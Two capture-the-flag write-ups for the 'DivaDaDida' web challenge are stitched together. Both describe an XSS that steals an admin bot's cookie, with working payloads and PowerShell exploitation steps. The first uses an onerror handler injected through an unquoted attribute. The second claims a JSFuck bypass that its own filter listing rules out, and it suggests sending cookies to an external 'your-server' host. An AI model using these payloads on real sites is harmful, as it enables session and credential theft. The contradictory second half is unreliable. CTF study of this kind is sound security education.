## DivaDaDida – Write‑up and Working Exploit

This documents everything we tried, why most ideas failed, and the final approach that reliably steals the admin bot’s cookie and recovers the flag.

---

### Challenge summary
- Target: AirOverflow Arena – DivaDaDida (Hard, 600 pts)
- Tech: Node.js + Express + EJS, Playwright (Firefox) admin bot
- Core endpoints:
  - POST `/search` → creates a search (stores `q` and `_`), redirects to `/search/:uuid`
  - GET `/search/:uuid` → renders `views/search.ejs`
  - GET `/searches` → lists stored searches
  - POST `/report` → admin bot visits only `http://localhost:3000/...`
- CSP: `script-src 'self' 'unsafe-inline' 'unsafe-eval'` (inline allowed, external/data blocked)

The vulnerable template (`views/search.ejs`) is:

```ejs
<script id=<%= query %>>
  <%- _ %>
</script>
```

- `query` (from form field `q`) is HTML-escaped and inserted as an UNQUOTED attribute value.
- `_` is rendered unescaped, but a server-side filter allows only a tiny character set.

---

## Filters and constraints

Server-side filter (applied only on GET `/search/:uuid`, i.e. when rendering), rejects if any char in `_` is in a large ASCII set. Effectively, `_` may contain only these 10 characters:

```
+  =  [  ]  c  C  i  I  o  O
```

Everything else is blocked. This kills normal JavaScript, quotes, dots, parentheses, etc.

Important details we discovered:
- The POST `/search` does not parse JSON (no `express.json()`), so requests must be `application/x-www-form-urlencoded`.
- In form encoding, `+` becomes a space unless URL-encoded as `%2B`.
- `query` (`q`) is HTML-escaped but unquoted in `id=...`, allowing extra attributes via spaces.
- CSP allows inline JS but blocks `data:` and external hosts for scripts.

---

## What we tried (and why it failed)

1) JSFuck and variants (needs `!`, parentheses, etc.)
- Blocked by the `_` character filter.

2) Unicode fullwidth operator trick (U+FF08, U+FF09, U+FF01)
- Bypasses ASCII filter, but JavaScript does not treat these as operators, so the code doesn’t execute.

3) Inject via `q` (query) to break out with `<` / `>`
- `q` is HTML-escaped (`<%= %>`), so `<` becomes `&lt;`, etc. No tag breakouts.

4) `data:`/external `src` to load a payload
- Blocked by CSP (`script-src 'self'`), so `data:` and non-self origins won’t execute.

5) Newlines/specials in `q`
- Newlines are preserved but still inside the attribute; without `<`/`>`, no clean breakout.

6) Posting JSON payloads
- App doesn’t use `express.json()`. JSON bodies looked like “no response” or weird behavior since the server never parsed them.

---

## Key breakthrough

Unquoted attribute injection via `q` (HTML-escaped but unquoted) lets us add extra attributes using spaces:

```
<script id=x src=/nope.js onerror=...>
```

Script `onerror` is allowed (inline JS permitted by CSP). So we can intentionally load a failing `src` (`/nope.js` will 404), and use the `onerror` handler to execute arbitrary inline JS.

We leverage that to POST the cookie back to the same application (no external requests needed):

```
onerror=fetch('/search',{
  method:'POST',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'q='+encodeURIComponent(document.cookie)+'&_=%5B%5D'
})
```

Why this works:
- `document.cookie` contains the admin flag (non-HttpOnly).
- We POST to our own `/search` endpoint with `q=<cookie>`.
- We set `_=%5B%5D` (i.e., `[]`) so it passes the strict `_` filter on render.
- `/searches` later shows the stored `q` values; we extract `PCC{...}`.

---

## Final payload shape

- Form field `q` (UNQUOTED attribute injection):

```
q = x src=/nope.js onerror=fetch('/search',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'q='+encodeURIComponent(document.cookie)+'&_=%5B%5D'}) x
```

- Form field `_`: `[]` (URL-encoded when sending as body: `%5B%5D`)

Rendered result (simplified):

```html
<script id=x src=/nope.js onerror="fetch('/search',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'q='+encodeURIComponent(document.cookie)+'&_=%5B%5D'}) x">
  []
</script>
```

`/nope.js` 404s → `onerror` fires → cookie is POSTed into the app → we read it from `/searches`.

---

## How to run (Windows PowerShell)

Prereqs: container running; base URL/port from Arena (example below uses `http://c1.arena.airoverflow.com:7767`).

Option A: Minimal exploit (recommended)

```powershell
powershell -ExecutionPolicy Bypass -File run_exploit_min.ps1
```

- The script:
  - POSTs the crafted page
  - Reports `http://localhost:3000/search/<uuid>` to the admin bot
  - Waits ~15s, then GETs `/searches` and prints the flag

If your port changes, override on the command line:

```powershell
powershell -ExecutionPolicy Bypass -File run_exploit_min.ps1 -BaseUrl "http://c1.arena.airoverflow.com:<PORT>"
```

Option B: Verbose exploit

`run_exploit.ps1` is a more verbose variant (same technique). If you use it, ensure the `-BaseUrl` matches the current port.

---

## Flag

Example recovery (from a successful run):

```
PCC{viv4_74_vid4_i5_d1v4_d1d4_9d6Ntwpn7x}
```

---

## Troubleshooting

- “No redirect/UUID” after POST `/search`:
  - Ensure you’re using `application/x-www-form-urlencoded` (the app doesn’t parse JSON bodies).

- “Blocked! Nice try.” on viewing `/search/<uuid>`:
  - URL-encode `+` characters inside `_` (form `+` → space). For safety set `_=%5B%5D`.

- “No flag yet” after reporting:
  - Increase wait time; the bot waits and network idles.
  - Verify the script line shows `src=/nope.js onerror=...` in the rendered HTML.
  - Confirm the report URL is `http://localhost:3000/search/<uuid>` (bot rejects other hosts).

- Data URIs / externals don’t run:
  - Expected—CSP restricts to `'self'` plus inline; that’s why we use `onerror` + inline fetch.

---

## Files in this workspace

- `run_exploit_min.ps1` – minimal, clean end‑to‑end exploit that prints the flag.
- `run_exploit.ps1` – verbose variant (same technique) with optional verification.
- `onerror_exploit.ps1` – earlier POC for `onerror` attribute approach.
- `extracted/` – challenge source (for reference: `app.js`, `views/*.ejs`).

---

## Takeaways

- Unquoted HTML attributes can be abused even when content is HTML-escaped—spaces let you inject more attributes.
- Inline JS (`'unsafe-inline'`) is a big deal, even with tight character filters elsewhere.
- Correct content type and URL-encoding matter: form `+` decoding to space can silently break “allowed” payloads.
# DivaDaDida - Complete Solution Summary

## Challenge Information
- **Name**: DivaDaDida  
- **Points**: 600
- **Difficulty**: Hard
- **Category**: Web
- **Live URL**: http://r1.arena.airoverflow.com:65340/

## Vulnerability Type
**XSS (Cross-Site Scripting)** with character filter bypass using **JSFuck**

## Files Created
1. ✅ `SOLUTION.md` - Detailed vulnerability analysis
2. ✅ `EXPLOIT_GUIDE.md` - Step-by-step exploitation guide
3. ✅ `EXPLOIT_COMMANDS.md` - Curl commands for exploitation
4. ✅ `exploit_runner.py` - Automated exploitation script
5. ✅ `generate_exploit.py` - Payload generator
6. ✅ `exploit.html` - HTML form for manual testing

## Quick Exploitation Steps

### 1. Generate JSFuck Payload
```
Visit: https://jsfuck.com/
Input: location='/searches?c='+document.cookie
Click: Encode
Copy: The entire output
Save: To jsfuck_payload.txt
```

### 2. Run the Exploit Script
```powershell
cd "c:\Users\haryp\Downloads\web diva"
python exploit_runner.py
```

### 3. Manual Exploitation (Alternative)
```powershell
# Read the JSFuck payload
$payload = Get-Content jsfuck_payload.txt -Raw

# Submit to /search
$body = @{
    q = 'test'
    _ = $payload
}
$response = Invoke-WebRequest -Uri 'http://r1.arena.airoverflow.com:65340/search' -Method POST -Body $body -MaximumRedirection 0 -ErrorAction SilentlyContinue

# Extract UUID from redirect
$uuid = ($response.Headers.Location -split '/')[-1]
Write-Host "UUID: $uuid"

# Report to admin
$reportBody = @{
    url = "http://r1.arena.airoverflow.com:65340/search/$uuid"
}
Invoke-WebRequest -Uri 'http://r1.arena.airoverflow.com:65340/report' -Method POST -Body $reportBody

# Check /searches for flag
Start-Process "http://r1.arena.airoverflow.com:65340/searches"
```

## Why This Works

### The Vulnerability
```javascript
// In views/search.ejs:
<script id=<%= query %>>
    <%- _ %>    // ← Unescaped rendering = XSS!
</script>
```

### The Filter Bypass
```javascript
// Filter blocks most characters but MISSES:
const lowercase = 'abdefghjklmnpqrstuvwxyz';  // Missing: c, i, o
const special = '!"#$%&\'()*,-./:;<>?@\\^_`{|}~\t\n\r ';  // Missing: +, [, ]

// JSFuck only needs: [ ] ( ) ! +
// Perfect bypass! ✓
```

### The Payload
```javascript
// When admin visits our malicious search:
location='/searches?c='+document.cookie

// This redirects admin to /searches with their cookie (containing flag)
// We can then see it in the URL or server logs
```

## Attack Flow
```
1. Attacker creates search with JSFuck XSS payload
   POST /search with q=test, _=<JSFUCK>
   
2. Server responds with redirect to /search/<UUID>
   
3. Attacker reports URL to admin
   POST /report with url=http://localhost:3000/search/<UUID>
   
4. Admin bot visits the URL with flag cookie
   
5. XSS executes: location='/searches?c='+document.cookie
   
6. Admin redirected to /searches?c=flag=PCC{...}
   
7. Attacker captures flag from URL/logs
```

## Key Tools & Resources

### Required
- **JSFuck Encoder**: https://jsfuck.com/
- **Python 3**: For running exploit scripts
- **Requests library**: `pip install requests`

### Optional (for external exfiltration)
- **HTTP Server**: `python -m http.server 8000`
- **ngrok**: To expose local server
- **Burp Suite**: For manual testing

## Common Issues & Solutions

### Issue 1: Payload Too Long
**Solution**: JSFuck creates very long strings (~50k chars). This is normal and expected.

### Issue 2: Filter Still Blocks
**Solution**: Verify your payload ONLY contains: `[ ] ( ) ! +`
Run this check:
```python
allowed = set('[]()!+')
if all(c in allowed for c in payload):
    print("✓ Payload is valid")
```

### Issue 3: Can't See Flag in /searches
**Solution**: Try external exfiltration:
1. Set up webhook/server
2. Use payload: `location='https://your-server/?c='+document.cookie`
3. Encode with JSFuck and re-run exploit

### Issue 4: CSP Blocks External Requests
**Solution**: The CSP allows `connect-src 'self'`, so use:
- Internal redirect: `/searches?c='+document.cookie`
- Or `fetch()` to internal endpoint you control

## Expected Flag Format
```
PCC{...}
```

## Testing Locally

If you want to test before attacking the live server:

```powershell
cd "c:\Users\haryp\Downloads\web diva\extracted"
npm install
npm start

# Then exploit localhost:3000 instead
```

## Success Indicators

✓ JSFuck payload submitted successfully  
✓ Got UUID in redirect response  
✓ Admin bot visited the URL  
✓ Admin redirected to /searches with cookie  
✓ Flag captured: `PCC{...}`  

## Additional Notes

- The challenge name "Viva la Vida is actually Diva Da Dida" is a hint
- Firefox is used by the admin bot (Playwright)
- Cookie is **not** httpOnly (can be read by JavaScript)
- No external resources allowed due to CSP
- The `+` character being unblockedis the key vulnerability

## Next Steps

1. ✅ Generate JSFuck payload at https://jsfuck.com/
2. ✅ Save to `jsfuck_payload.txt`
3. ✅ Run `python exploit_runner.py`
4. ✅ Get your flag!

Good luck! 🚀
